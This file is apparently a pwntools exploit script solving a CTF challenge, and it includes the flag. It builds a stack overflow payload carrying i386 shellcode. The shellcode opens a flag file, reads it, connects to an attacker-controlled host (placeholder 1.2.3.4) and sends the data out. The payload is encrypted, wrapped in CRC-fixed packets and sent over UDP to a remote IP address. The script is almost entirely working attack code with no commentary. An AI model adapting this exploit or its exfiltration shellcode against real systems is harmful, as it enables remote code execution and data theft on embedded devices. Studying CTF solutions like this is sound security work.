from pwn import *

# rwctf{3af93fd83c6d9b4188d236225347e480}

context.arch = 'i386'

HOST = '1.2.3.4'
PORT = 0x4141

def encrypt(s):
    p = process(['./e', 'enc'])
    p.send(s)
    p.shutdown()
    d = p.recvall()
    assert len(d) >= len(s)
    print('enc %d %s => %d %s' % (len(s), s.hex(), len(d), d.hex()))
    return d

def fix_crc(s):
    p = process(['./e', 'crc'])
    p.send(s)
    p.shutdown()
    d = p.recvall()
    assert len(d) == len(s)
    print('crc %s => %s' % (s.hex(), d.hex()))
    return d

magic = b'\x7E\x6D\x5C\x4B'

_open = 0x487E6E
_read = 0x487925
_printf = 0x482C0A
_socket = 0x4B1DB2
_connect = 0x4B1B53
zbufSockBufSendto = 0x454C4F
ebp = 0x677608
filename = ebp - 0x30 + 0x200
sockaddr = filename + 0x20
payload = b'0.0.0.0\x00'.ljust(0x30, b'X')
payload += p32(ebp - 0x300) + p32(ebp + 8)
payload += asm('''
sub esp, 0x400
xor eax, eax
mov [esp+8], eax
; mov eax, 2
mov [esp+4], eax
mov eax, %#x
mov [esp], eax
mov eax, %#x
call eax

mov ecx, 0x100
mov [esp+8], ecx
lea ebx, [esp + 0x80]
mov [esp+4], ebx
mov [esp], eax
mov edx, %#x
call edx

xor eax, eax
mov [esp+8], eax
inc al
mov [esp+4], eax
inc al
mov [esp], eax
mov eax, %#x
call eax

mov [esp+0x60], eax

mov [esp], eax
mov eax, %#x
mov [esp+4], eax
mov eax, 16
mov [esp+8], eax
mov eax, %#x
call eax

mov eax, [esp+0x60]
mov [esp], eax
lea ebx, [esp + 0x80]
mov [esp+4], ebx
mov eax, 0x100
mov [esp+8], eax
xor eax, eax
mov [esp+0xc], eax
mov [esp+0x10], eax
mov [esp+0x14], eax
mov eax, %#x
call eax
''' % (filename, _open, _read, _socket, sockaddr, _connect, zbufSockBufSendto))
payload = payload.ljust(0x200)
payload += b'/ata01:1/flag\x00'.ljust(0x20)
payload += b'\x10\x02' + p16(PORT) + bytes(map(int, HOST.split('.')))

master_addr = encrypt(p32(0) + p16(len(payload)) + payload)
set_master_addr_pkt = fix_crc(magic + p16(len(master_addr)) + p8(3) + p8(2) + p32(0) + p32(0) + master_addr)

key = encrypt(b'dorimifasolaxi\x00')
req_beat_pkt = fix_crc(magic + p16(len(key)) + p8(1) + p8(2) + p32(0) + p32(0) + key)

r = remote('13.52.189.117', 39707, typ='udp')

r.send(set_master_addr_pkt)
raw_input('beat')
r.send(req_beat_pkt)
